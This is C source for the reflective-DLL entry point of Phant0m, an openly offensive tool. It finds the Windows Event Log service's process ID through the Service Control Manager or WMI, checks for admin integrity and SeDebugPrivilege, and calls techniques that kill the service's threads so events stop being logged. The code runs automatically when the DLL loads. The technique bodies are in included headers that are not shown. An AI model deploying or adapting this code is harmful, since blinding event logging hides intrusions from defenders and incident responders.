#include "ReflectiveLoader.h"

extern "C" HINSTANCE hAppInstance;
typedef long NTSTATUS;

#include <windows.h>
#include <stdio.h>

#include "../include/process_info.h"

// PID detection techniques configuration section.
#define PID_FROM_SCM 1 // If you set it to 1, the PID of the Event Log service is obtained from the Service Manager.
#define PID_FROM_WMI 0 // If you set it to 1, the PID of the Event Log service is obtained from the WMI.


// TID detection and kill techniques configuration section. 
#define KILL_WITH_T1 1 // If you set it to 1, Technique-1 will be use. For more information; https://github.com/hlldz/Phant0m
#define KILL_WITH_T2 0 // If you set it to 1, Technique-2 will be use. For more information; https://github.com/hlldz/Phant0m


#if defined(PID_FROM_SCM) && PID_FROM_SCM == 1
#include "../include/pid_SCM.h"
#endif

#if defined(PID_FROM_WMI) && PID_FROM_WMI == 1
#include "../include/pid_WMI.h"
#endif


#if defined(KILL_WITH_T1) && KILL_WITH_T1 == 1
#include "../include/technique_1.h"
#endif

#if defined(KILL_WITH_T2) && KILL_WITH_T2 == 1
#include "../include/technique_2.h"
#endif

void Phant0m() {

	puts(
		"\t ___ _  _   _   _  _ _____ __  __  __ \n"
		"\t| _ \\ || | /_\\ | \\| |_   _/  \\|  \\/  |\n"
		"\t|  _/ __ |/ _ \\| .` | | || () | |\\/| |\n"
		"\t|_| |_||_/_/ \\_\\_|\\_| |_| \\__/|_|  |_|\n\n"
		"\tVersion: 2.0\n"
		"\tAuthor:  Halil Dalabasmaz\n"
		"\tWWW:     artofpwn.com\n"
		"\tTwitter: @hlldz\n"
		"\tGithub:  @hlldz\n"
	);

	if (enoughIntegrityLevel() == TRUE) {

		printf("[+] Process Integrity Level is high, continuing...\n\n");

		if (isPrivilegeOK() == TRUE) {

#if defined(PID_FROM_SCM) && PID_FROM_SCM == 1
			DWORD dwEventLogPID = GetPIDFromSCManager();
#endif

#if defined(PID_FROM_WMI) && PID_FROM_WMI == 1
			DWORD dwEventLogPID = GetPIDFromWMI();
#endif

			if (dwEventLogPID != 0) {

				printf("[+] Event Log service PID detected as %d.\n\n", dwEventLogPID);

#if defined(KILL_WITH_T1) && KILL_WITH_T1 == 1
				Technique_1(dwEventLogPID);
#endif

#if defined(KILL_WITH_T2) && KILL_WITH_T2 == 1
				Technique_2(dwEventLogPID);
#endif

			}
			else {

				printf("[!] Exiting...\n");

			}
		}
		else {

			printf("[!] SeDebugPrivilege cannot enabled. Exiting...\n");

		}

	}
	else {

		printf("[!] Process Integrity Level is not high. Exiting...\n");

	}

	printf("\n[*] All done.\n");

}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	BOOL bReturnValue = TRUE;
	switch (dwReason) {
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;

		Phant0m();

		/* flush STDOUT */
		fflush(stdout);

		/* we're done, so let's exit */
		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}